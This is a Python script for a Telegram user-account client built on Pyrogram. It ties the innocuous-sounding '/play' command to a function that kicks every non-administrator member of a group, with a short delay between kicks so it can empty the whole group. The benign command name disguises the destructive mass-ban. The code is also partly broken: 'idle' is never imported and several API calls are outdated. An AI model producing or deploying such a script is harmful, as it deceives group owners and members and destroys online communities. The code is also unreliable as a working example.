from pyrogram import Client, filters
import asyncio

# Create a Pyrogram client
app = Client("my_account")

# Define an asynchronous function to ban all users except administrators
async def ban_all_users(client, message):
    if not message.chat.type == "supergroup":
        await message.reply("Noob !! Use This Cmd in Group.")
    else:
        chat_id = message.chat.id
        admins = await client.get_chat_members(chat_id, filter="administrators")
        admins_ids = [admin.user.id for admin in admins]
        all_users = 0
        banned_users = 0
        async for member in client.iter_chat_members(chat_id):
            all_users += 1
            if member.user.id not in admins_ids:
                await client.kick_chat_member(chat_id, member.user.id)
                banned_users += 1
                await asyncio.sleep(0.1)
        await message.reply(f"Banned {banned_users} out of {all_users} users.")

# Define a handler for the /play command
@app.on_message(filters.command("play"))
async def play_command_handler(client, message):
    await ban_all_users(client, message)

# Start the Pyrogram client
async def main():
    await app.start()
    await idle()

asyncio.run(main())
